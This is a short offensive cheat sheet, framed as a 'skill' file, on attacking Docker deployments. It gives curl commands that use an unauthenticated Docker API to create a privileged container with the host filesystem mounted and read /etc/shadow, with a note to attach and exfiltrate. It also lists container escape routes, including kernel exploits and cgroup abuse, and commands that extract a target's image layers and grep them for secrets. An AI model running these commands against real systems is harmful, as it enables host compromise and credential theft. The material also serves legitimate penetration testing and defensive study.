# SKILL: Docker Attacks
## Version: 1.0 | Domain: infra

---

## EXPOSED DOCKER DAEMON (2375/2376)
```bash
# Unauth Docker API → full host RCE
curl -s http://TARGET:2375/version
curl -s http://TARGET:2375/containers/json

# Create privileged container with host mount
curl -s http://TARGET:2375/containers/create -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["chroot","/mnt","sh","-c","cat /etc/shadow"],"Binds":["/:/mnt"],"Privileged":true}'
# Then start + attach to exfil
```

## CONTAINER ESCAPE
- **Privileged container** → mount host disk
- **Docker socket mounted** → spawn new container with host mount
- **Kernel exploit** (Dirty Pipe, OverlayFS) → break out
- **CAP_SYS_ADMIN + unshare** → mount cgroup escape

## IMAGE ANALYSIS
```bash
# Pull target's public images
docker pull target/app:latest
docker history target/app:latest
docker save target/app:latest | tar xv -O '*.tar' | tar xv
# Search extracted layers for secrets
grep -rE 'password|secret|key|token' extracted/
```

## TOOLS
deepce (container escape scanner), docker-bench-security, trivy (vuln scan)

## REFERENCES
Docker Security docs • OWASP Docker Security Cheatsheet
